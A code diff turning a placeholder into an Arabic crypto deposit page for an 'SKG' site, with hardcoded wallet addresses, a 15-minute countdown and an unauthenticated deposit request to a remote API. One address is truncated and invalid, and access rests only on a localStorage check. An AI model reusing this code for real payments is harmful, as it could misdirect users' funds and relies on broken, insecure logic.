@@ -1,79 +1,382 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>الإيداع - SKG</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>الإيداع - SKG</title>
 
-<style>
+  <style>
+    *{
+      box-sizing:border-box;
+      font-family:Arial,sans-serif;
+    }
 
-body{
-background:#000;
-color:#fff;
-font-family:Arial;
-text-align:center;
-padding:40px;
-}
+    body{
+      margin:0;
+      background:#000;
+      color:#fff;
+      padding:20px;
+    }
 
-.box{
-background:#111;
-max-width:400px;
-margin:auto;
-padding:30px;
-border-radius:12px;
-border-top:3px solid gold;
-}
+    .box{
+      background:#111;
+      max-width:700px;
+      margin:auto;
+      padding:24px;
+      border-radius:14px;
+      border-top:3px solid gold;
+    }
 
-h2{
-color:gold;
-margin-bottom:20px;
-}
+    h2{
+      color:gold;
+      text-align:center;
+      margin-bottom:12px;
+    }
 
-input{
-width:100%;
-padding:12px;
-margin-top:10px;
-border:none;
-border-radius:6px;
-background:#222;
-color:white;
-}
+    p{
+      color:#ccc;
+      line-height:1.7;
+      text-align:center;
+    }
 
-button{
-margin-top:20px;
-padding:12px;
-width:100%;
-background:gold;
-border:none;
-border-radius:6px;
-font-weight:bold;
-}
+    label{
+      display:block;
+      margin-top:16px;
+      margin-bottom:8px;
+      color:#eee;
+      font-size:14px;
+    }
 
-a{
-display:block;
-margin-top:20px;
-color:gold;
-text-decoration:none;
-}
+    select,input{
+      width:100%;
+      padding:12px;
+      border:none;
+      border-radius:8px;
+      background:#222;
+      color:#fff;
+      outline:none;
+    }
 
-</style>
+    .address-box{
+      margin-top:16px;
+      background:#181818;
+      border:1px solid #2a2a2a;
+      border-right:4px solid gold;
+      border-radius:12px;
+      padding:14px;
+    }
+
+    .address-title{
+      color:gold;
+      margin-bottom:8px;
+      font-size:15px;
+    }
+
+    .address-value{
+      word-break:break-all;
+      color:#ddd;
+      font-size:14px;
+      line-height:1.8;
+      background:#0f0f0f;
+      padding:12px;
+      border-radius:8px;
+    }
+
+    .btn-row{
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:12px;
+      margin-top:14px;
+    }
+
+    button{
+      padding:12px;
+      border:none;
+      border-radius:8px;
+      font-weight:bold;
+      cursor:pointer;
+    }
+
+    .primary{
+      background:gold;
+      color:#000;
+    }
+
+    .secondary{
+      background:#333;
+      color:#fff;
+    }
+
+    .timer{
+      margin-top:16px;
+      text-align:center;
+      font-size:22px;
+      color:gold;
+      font-weight:bold;
+      display:none;
+    }
+
+    .timer-note{
+      text-align:center;
+      color:#bbb;
+      margin-top:6px;
+      display:none;
+    }
+
+    .message{
+      margin-top:14px;
+      text-align:center;
+      font-size:14px;
+      line-height:1.7;
+    }
+
+    .success{
+      color:#22c55e;
+    }
+
+    .error{
+      color:#ef4444;
+    }
+
+    a{
+      display:block;
+      margin-top:22px;
+      color:gold;
+      text-decoration:none;
+      text-align:center;
+    }
+
+    .note{
+      margin-top:18px;
+      background:#181818;
+      border-right:3px solid gold;
+      padding:12px;
+      border-radius:8px;
+      color:#ccc;
+      line-height:1.8;
+      font-size:13px;
+    }
+  </style>
 </head>
-
 <body>
 
 <div class="box">
+  <h2>الإيداع</h2>
+  <p>اختر الشبكة، انسخ عنوان الإيداع، ثم أرسل طلب الإيداع. سيتم حفظ العملية في السجل بحالة <b>قيد المراجعة</b>.</p>
 
-<h2>إيداع تجريبي</h2>
+  <label>اختر شبكة الإيداع</label>
+  <select id="network" onchange="updateAddress()">
+    <option value="">-- اختر الشبكة --</option>
+    <option value="TRC20">USDT - TRC20</option>
+    <option value="BEP20">USDT - BEP20</option>
+    <option value="ERC20">USDT - ERC20</option>
+    <option value="TRX">TRX</option>
+    <option value="ETH">ETH - Ethereum</option>
+    <option value="USDC_BEP20">USDC - BEP20</option>
+    <option value="BTC">BTC - Bitcoin</option>
+  </select>
 
-<p>أدخل مبلغ الإيداع التجريبي</p>
+  <div class="address-box" id="addressBox" style="display:none;">
+    <div class="address-title" id="addressTitle">عنوان الإيداع</div>
+    <div class="address-value" id="addressValue"></div>
 
-<input type="number" placeholder="المبلغ">
+    <div class="btn-row">
+      <button class="secondary" onclick="copyAddress()">نسخ العنوان</button>
+      <button class="primary" onclick="startDepositTimer()">بدء مهلة الإيداع</button>
+    </div>
+  </div>
 
-<button>تأكيد الإيداع</button>
+  <div class="timer" id="timer">15:00</div>
+  <div class="timer-note" id="timerNote">الوقت المتبقي لإكمال الإيداع في هذه العملية</div>
 
-<a href="dashboard.html">العودة للوحة المستخدم</a>
+  <label>المبلغ</label>
+  <input id="amount" type="number" placeholder="اكتب مبلغ الإيداع" />
 
+  <div class="btn-row">
+    <button class="primary" onclick="submitDeposit()">إرسال طلب الإيداع</button>
+    <button class="secondary" onclick="resetTimer()">إعادة تعيين العداد</button>
+  </div>
+
+  <div id="message" class="message"></div>
+
+  <a href="dashboard.html">العودة للوحة المستخدم</a>
+
+  <div class="note">
+    هذه صفحة تجريبية. العداد والسجل وحالة المراجعة كلها لأغراض العرض داخل المشروع فقط.
+  </div>
 </div>
 
+<script>
+  const API_URL = "https://skg-api.onrender.com";
+  const savedUser = localStorage.getItem("skgUser");
+  const messageBox = document.getElementById("message");
+
+  if (!savedUser) {
+    window.location.href = "login.html";
+  }
+
+  const depositAddresses = {
+    TRC20: {
+      title: "USDT - TRC20",
+      address: "TLPZEoW71BNe6mHPK8XRJ5PkN5Agqqpa5n"
+    },
+    BEP20: {
+      title: "USDT - BEP20",
+      address: "0x990635c24b47a3ebbc14efadf0355e26ec706"
+    },
+    ERC20: {
+      title: "USDT - ERC20",
+      address: "0x990635c24b47a3ebbc14efadf0355e26ec706385"
+    },
+    TRX: {
+      title: "TRX",
+      address: "TLPZEoW71BNe6mHPK8XRJ5PkN5Agqqpa5n"
+    },
+    ETH: {
+      title: "ETH - Ethereum",
+      address: "0x990635c24b47a3ebbc14efadf0355e26ec706385"
+    },
+    USDC_BEP20: {
+      title: "USDC - BEP20",
+      address: "0x990635c24b47a3ebbc14efadf0355e26ec706385"
+    },
+    BTC: {
+      title: "BTC - Bitcoin",
+      address: "1J4rcHG7afaEEFQL9o7GDcNc9noAZE6DVf"
+    }
+  };
+
+  let timerInterval = null;
+  let timeLeft = 15 * 60;
+
+  function updateAddress() {
+    const network = document.getElementById("network").value;
+    const box = document.getElementById("addressBox");
+    const title = document.getElementById("addressTitle");
+    const value = document.getElementById("addressValue");
+
+    if (!network || !depositAddresses[network]) {
+      box.style.display = "none";
+      return;
+    }
+
+    box.style.display = "block";
+    title.textContent = "عنوان الإيداع - " + depositAddresses[network].title;
+    value.textContent = depositAddresses[network].address;
+  }
+
+  function copyAddress() {
+    const network = document.getElementById("network").value;
+    if (!network || !depositAddresses[network]) return;
+
+    navigator.clipboard.writeText(depositAddresses[network].address)
+      .then(() => {
+        showMessage("تم نسخ عنوان الإيداع ✅", "success");
+      })
+      .catch(() => {
+        showMessage("تعذر نسخ العنوان.", "error");
+      });
+  }
+
+  function startDepositTimer() {
+    resetTimer();
+    timeLeft = 15 * 60;
+
+    document.getElementById("timer").style.display = "block";
+    document.getElementById("timerNote").style.display = "block";
+    renderTimer();
+
+    timerInterval = setInterval(() => {
+      timeLeft--;
+      renderTimer();
+
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        showMessage("انتهت مهلة هذه العملية. يمكنك بدء مهلة جديدة.", "error");
+      }
+    }, 1000);
+  }
+
+  function resetTimer() {
+    if (timerInterval) {
+      clearInterval(timerInterval);
+    }
+    timeLeft = 15 * 60;
+    document.getElementById("timer").textContent = "15:00";
+    document.getElementById("timer").style.display = "none";
+    document.getElementById("timerNote").style.display = "none";
+  }
+
+  function renderTimer() {
+    const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+    const seconds = String(timeLeft % 60).padStart(2, "0");
+    document.getElementById("timer").textContent = minutes + ":" + seconds;
+  }
+
+  function showMessage(text, type) {
+    messageBox.className = "message";
+    if (type) messageBox.classList.add(type);
+    messageBox.textContent = text;
+  }
+
+  function saveDepositToHistory(entry) {
+    const history = JSON.parse(localStorage.getItem("skgHistory") || "[]");
+    history.unshift(entry);
+    localStorage.setItem("skgHistory", JSON.stringify(history));
+  }
+
+  async function submitDeposit() {
+    showMessage("", "");
+
+    const user = JSON.parse(savedUser);
+    const network = document.getElementById("network").value;
+    const amount = Number(document.getElementById("amount").value);
+
+    if (!network || !depositAddresses[network]) {
+      showMessage("يرجى اختيار شبكة الإيداع.", "error");
+      return;
+    }
+
+    if (!amount || amount <= 0) {
+      showMessage("يرجى إدخال مبلغ صحيح.", "error");
+      return;
+    }
+
+    try {
+      const response = await fetch(API_URL + "/deposit-request", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: user.email,
+          amount: amount
+        })
+      });
+
+      const data = await response.json();
+
+      if (data.ok) {
+        saveDepositToHistory({
+          id: data.request.id,
+          type: "إيداع",
+          network: depositAddresses[network].title,
+          address: depositAddresses[network].address,
+          amount: amount,
+          status: "قيد المراجعة",
+          createdAt: new Date().toISOString()
+        });
+
+        showMessage("تم إرسال طلب الإيداع وحفظه في السجل ✅", "success");
+        document.getElementById("amount").value = "";
+      } else {
+        showMessage(data.error || "فشل إرسال طلب الإيداع.", "error");
+      }
+    } catch (error) {
+      showMessage("تعذر الاتصال بالسيرفر.", "error");
+    }
+  }
+</script>
+
 </body>
-</html>
+  </html>
